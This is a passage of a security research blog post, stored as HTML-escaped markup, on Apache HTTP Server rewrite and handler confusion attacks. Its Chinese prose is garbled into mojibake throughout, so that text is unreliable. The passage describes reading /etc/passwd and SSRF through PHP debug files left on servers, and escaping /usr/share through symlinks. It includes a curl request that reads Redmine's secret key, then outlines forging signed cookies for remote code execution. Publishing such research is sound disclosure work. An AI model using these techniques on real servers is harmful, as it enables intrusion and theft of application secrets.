        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getParameterByName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newURL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/index.html?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;latest/index.html&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å› æ­¤å°±ç®—ç›®æ¨™æ²’æœ‰éƒ¨ç½²ä»»ä½•ç¶²é æ‡‰ç”¨ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥åˆ©ç”¨ä¸€å€‹ä¸å®‰å…¨çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; é€éä½œæ¥­ç³»çµ±è‡ªå¸¶çš„æª”æ¡ˆä¾†å‰µé€ å‡º XSSã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-2-2-3-local-gadget-to-lfi&quot;&gt;âœ”ï¸ 2-2-3. Local Gadget to LFI&lt;/h5&gt;

&lt;p&gt;è‡³æ–¼ä»»æ„æª”æ¡ˆè®€å–å‘¢ï¼Ÿ å¦‚æœç›®æ¨™ä¼ºæœå™¨ä¸Šå®‰è£äº†ä¸€äº› PHP ç”šè‡³å‰ç«¯æ‡‰ç”¨å¥—ä»¶ï¼Œä¾‹å¦‚ JpGraphã€jQuery-jFeed ç”šè‡³ WordPress æˆ– Moodle å¤–æ›ï¼Œé‚£éº¼å®ƒå€‘è‡ªå¸¶çš„ä½¿ç”¨æ•™å­¸æˆ–æ˜¯é™¤éŒ¯ç”¨ç¨‹å¼ç¢¼éƒ½å¯ä»¥è®Šæˆåˆ©ç”¨çš„å°è±¡ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php&lt;/li&gt;
  &lt;li&gt;/usr/share/javascript/jquery-jfeed/proxy.php&lt;/li&gt;
  &lt;li&gt;/usr/share/moodle/mod/assignment/type/wims/getcsv.php&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€™è£¡å±•ç¤ºåˆ©ç”¨ jQuery-jFeed æ‰€è‡ªå¸¶çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxy.php&lt;/code&gt; ä¾†è®€å– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-2-2-4-local-gadget-to-ssrf&quot;&gt;âœ”ï¸ 2-2-4. Local Gadget to SSRF&lt;/h5&gt;

&lt;p&gt;ç•¶ç„¶æ‰¾åˆ°ä¸€å€‹ SSRF ä¹Ÿä¸åœ¨è©±ä¸‹ï¼Œä¾‹å¦‚ MagpieRSS æä¾›äº†ä¸€å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magpie_debug.php&lt;/code&gt; æª”æ¡ˆå°±æ˜¯ä¸€å€‹çµ•ä½³çš„å°å·¥å…·ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/php/magpierss/scripts/magpie_debug.php&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;ï¸-2-2-5-local-gadget-to-rce&quot;&gt;âœ”ï¸ 2-2-5. Local Gadget to RCE&lt;/h5&gt;

&lt;p&gt;æ‰€ä»¥èƒ½ RCE å—ï¼Ÿ åˆ¥æ€¥æˆ‘å€‘å…ˆæ…¢æ…¢ä¾†ï¼ é¦–å…ˆé€™å€‹æ”»æ“Šæ‰‹æ³•å·²ç¶“å¯ä»¥æŠŠæ—¢æœ‰çš„æ”»æ“Šé¢å…¨éƒ¨é‡æ–°å¥—ç”¨ä¸€æ¬¡äº†ï¼Œä¾‹å¦‚åœ¨æŸæ¬¡é–‹ç™¼éç¨‹ä¸­ä¸å°å¿ƒè¢«éºç•™ä¸‹ä¾† (ç”šè‡³å¯èƒ½é‚„æ˜¯è¢«ç¬¬ä¸‰æ–¹å¥—ä»¶æ‰€ä¾è³´çš„) çš„èˆŠç‰ˆæœ¬ PHPUnitï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ &lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841&quot;&gt;CVE-2017-9841&lt;/a&gt; ä¾†åŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼ï¼Œåˆæˆ–è€…æ˜¯å®‰è£å®Œ phpLiteAdmin (ç”±æ–¼æ˜¯å”¯è®€å‰¯æœ¬æ‰€ä»¥é è¨­å¯†ç¢¼æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;)ï¼Œç›¸ä¿¡çœ‹åˆ°é€™é‚Šæœƒç™¼ç¾ Local Gadgets Manipulation é€™å€‹æ”»æ“Šæ‰‹æ³•å­˜åœ¨è‘—ç„¡çª®æ½›åŠ›ï¼Œå‰©ä¸‹åªæ˜¯ç™¼æ˜å‡ºæ›´å²å®³ä»¥åŠæ›´é€šç”¨çš„å°å·¥å…·ï¼&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-2-3-jailbreak-from-local-gadgets&quot;&gt;âš”ï¸ Primitive 2-3. Jailbreak from Local Gadgets&lt;/h4&gt;

&lt;p&gt;çœ‹åˆ°é€™è£¡ä½ å¯èƒ½æœƒå¥½å¥‡ï¼š ã€ŒçœŸçš„ä¸èƒ½è·³å‡º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; å—ï¼Ÿã€ ç•¶ç„¶å¯ä»¥ï¼Œé€™ä¹Ÿæ˜¯è¦ä»‹ç´¹çš„ç¬¬ä¸‰å€‹æ”»æ“Šæ‰‹æ³• â€”â€” &lt;strong&gt;å¾ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; ä¸­è¶Šç„ï¼&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L160&quot;&gt;Debian/Ubuntu&lt;/a&gt; çš„ Httpd ç™¼è¡Œç‰ˆä¸­é è¨­é–‹å•Ÿäº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FollowSymLinks&lt;/code&gt; é¸é …ï¼Œå°±ç®—é Debian/Ubuntu ç™¼è¡Œç‰ˆä½† Apache HTTP Server ä¹Ÿéš±å«åœ°é è¨­&lt;a href=&quot;https://httpd.apache.org/docs/current/mod/core.html#options&quot;&gt;å…è¨±ç¬¦è™Ÿé€£çµ&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Options&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;FollowSymLinks&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;ï¸-2-3-1-jailbreak-from-local-gadgets&quot;&gt;âœ”ï¸ 2-3-1. Jailbreak from Local Gadgets&lt;/h5&gt;

&lt;p&gt;å› æ­¤åªè¦æœ‰å¥—ä»¶åœ¨å®ƒçš„å®‰è£ç›®éŒ„ä¸‹ç¬¦è™Ÿé€£çµåˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; å¤–ï¼Œé€™å€‹ç¬¦è™Ÿé€£çµå°±æˆç‚ºä¸€å€‹è·³æ¿å»å­˜å–æ›´å¤šçš„å°å·¥å…·å®Œæˆæ›´å¤šçš„åˆ©ç”¨ã€‚ é€™è£¡åˆ—å‡ºä¸€äº›æˆ‘å€‘å·²ç¶“ç™¼ç¾å¯åˆ©ç”¨çš„ç¬¦è™Ÿé€£çµï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Cacti Log&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/cacti/site/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/cacti/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Solr Data&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/solr/data/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/solr/data&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Solr Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/solr/conf/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/solr/conf/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MediaWiki Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/mediawiki/config/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/mediawiki/config/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SimpleSAMLphp Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/simplesamlphp/config/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/simplesamlphp/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;ï¸-2-3-2-jailbreak-local-gadgets-to-redmine-rce&quot;&gt;âœ”ï¸ 2-3-2. Jailbreak Local Gadgets to Redmine RCE&lt;/h5&gt;

&lt;p&gt;è¶Šç„æ”»æ“Šæ‰‹æ³•çš„æœ€å¾Œè®“æˆ‘å€‘å±•ç¤ºä¸€å€‹åˆ©ç”¨ Redmine çš„é›™å±¤ç¬¦è™Ÿé€£çµè·³èºå»å®Œæˆ RCE çš„ä¾‹å­ã€‚ åœ¨é è¨­å®‰è£çš„ Redmine ç¨‹å¼ç¢¼ç›®éŒ„ä¸­æœ‰å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;instances/&lt;/code&gt; ç›®éŒ„æŒ‡å‘ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/redmine/&lt;/code&gt;ï¼Œè€Œä½æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/redmine/&lt;/code&gt; ä¸‹çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;default/config/&lt;/code&gt; ç›®éŒ„åˆæŒ‡å‘ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/redmine/default/&lt;/code&gt; è³‡æ–™å¤¾ï¼Œè£¡é¢å­˜æ”¾è‘— Redmine çš„è³‡æ–™åº«è¨­å®šä»¥åŠæ‡‰ç”¨ç¨‹å¼ç§å¯†é‡‘é‘°ã€‚&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /usr/share/redmine/instances/
 symbolic &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;to /var/lib/redmine/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /var/lib/redmine/config/
 symbolic &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;to /etc/redmine/default/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /etc/redmine/default/
 database.yml    secret_key.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ–¼æ˜¯é€éä¸€å€‹ä¸å®‰å…¨çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ä»¥åŠå…©å±¤ç¬¦è™Ÿé€£çµï¼Œæˆ‘å€‘èƒ½å¤ è¼•é¬†å­˜å–åˆ° Redmine æ‰€ä½¿ç”¨çš„æ‡‰ç”¨ç¨‹å¼é‡‘é‘°ï¼š&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f
 HTTP/1.1 200 OK
 Server: Apache/2.4.59 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
 ...
 6d222c3c3a1881c865428edb79a74405
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è€Œ Redmine åˆæ˜¯åŸºæ–¼ Ruby on Rails æ‰€é–‹ç™¼çš„æ‡‰ç”¨ç¨‹å¼ï¼Œå…¶ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_key.txt&lt;/code&gt; çš„å…§å®¹å…¶å¯¦æ­£æ˜¯å…¶ç°½ç« åŠ å¯†æ‰€ä½¿ç”¨åˆ°çš„é‡‘é‘°ï¼Œæ¥ä¸‹ä¾†çš„æµç¨‹ç›¸ä¿¡å°&lt;a href=&quot;https://drive.google.com/file/d/1UMxphxFxwRf7wbrw4_Hr56KGPzpLU3Ef/view&quot;&gt;ç†Ÿæ‚‰æ”»æ“Š RoR çš„åŒå­¸&lt;/a&gt;æ‡‰è©²ä¸é™Œç”Ÿï¼Œé€éå·²çŸ¥çš„é‡‘é‘°å°‡æƒ¡æ„ Marshal ç‰©ä»¶ç°½ç« åŠ å¯†å¾ŒåµŒå…¥ Cookieï¼Œæ¥è‘—é€éä¼ºæœå™¨ç«¯çš„ååºåˆ—åŒ–æœ€çµ‚å¯¦ç¾é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-3-handler-confusion&quot;&gt;ğŸ”¥ 3. Handler Confusion&lt;/h3&gt;

&lt;p&gt;æœ€å¾Œä¸€å€‹è¦ä»‹ç´¹çš„æ”»æ“Šæ˜¯ Handler ä¸Šçš„ Confusionã€‚ é€™å€‹æ”»æ“ŠåŒæ¨£ä¹Ÿåˆ©ç”¨äº†ä¸€å€‹ Apache HTTP Server å¾ä¸Šå¤æ™‚æœŸæ¶æ§‹æ‰€éºç•™ä¸‹ä¾†çš„æŠ€è¡“å‚µã€‚é€™è£¡é€éä¸€å€‹ä¾‹å­ä¾†è®“è®€è€…å¿«é€Ÿçš„äº†è§£é€™å€‹æŠ€è¡“å‚µ â€”â€” å¦‚æœä»Šå¤©æƒ³åœ¨ Httpd ä¸Šé‹è¡Œç¶“å…¸çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt;ï¼Œä¸‹é¢å…©å€‹èªæ³•è¨­å®šä½ è¦ºå¾—å“ªå€‹æ‰æ˜¯æ­£ç¢ºçš„ï¼Ÿ&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; application/x-httpd-php .php
&lt;span class=&quot;nc&quot;&gt;AddType&lt;/span&gt;    application/x-httpd-php .php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç­”æ¡ˆæ˜¯ â€”â€” å…©å€‹éƒ½å¯ä»¥æ­£ç¢ºåœ°è®“ PHP é‹è¡Œèµ·ä¾†ï¼ é€™è£¡åˆ†åˆ¥æ˜¯å…©å€‹è¨­å®šçš„èªæ³•æ ¼å¼ï¼Œå¯ä»¥çœ‹åˆ°å…©å€‹è¨­å®šä¸åƒ…ç”¨æ³•ã€åƒæ•¸é¡ä¼¼ï¼Œç¾åœ¨é€£æ•ˆæœéƒ½ä¸€æ¨¡ä¸€æ¨£ï¼Œç‚ºä»€éº¼ Apache HTTP Server ç•¶åˆè¦è¨­è¨ˆå…©å€‹ä¸åŒçš„èªæ³•ï¼Ÿ&lt;/p&gt;

&lt;div class=&quot;language-config highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AddHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; [&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;] ...
&lt;span class=&quot;n&quot;&gt;AddType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;media&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; [&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;] ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯¦éš›ä¸Š &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler-name&lt;/code&gt; ä»¥åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;media-type&lt;/code&gt; åœ¨ Httpd çš„å…§éƒ¨çµæ§‹ä¸­ä»£è¡¨è‘—ä¸åŒçš„æ¬„ä½ï¼Œåˆ†åˆ¥å°æ‡‰åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; ä»¥åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt;ã€‚ è€Œ&lt;strong&gt;ä½¿ç”¨è€…å¯ä»¥åœ¨æ²’æœ‰æ„ŸçŸ¥çš„æƒ…æ³ä¸‹ä½¿ç”¨å‰‡æ­¸åŠŸæ–¼ä¸€æ®µå¾ &lt;a href=&quot;https://svn.apache.org/repos/asf/httpd/httpd/branches/1.3.x/src/main/http_config.c&quot;&gt;1996 å¹´&lt;/a&gt; Apache HTTP Server é–‹ç™¼åˆæœŸå°±éºç•™åˆ°ç¾åœ¨çš„ç¨‹å¼ç¢¼&lt;/strong&gt;ï¼š&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/server/config.c#L420&quot;&gt;server/config.c#L420&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AP_CORE_DECLARE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_invoke_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ap_strchr_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apr_pmemdup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

                &lt;span class=&quot;cm&quot;&gt;/* exclude media type arguments */&lt;/span&gt;
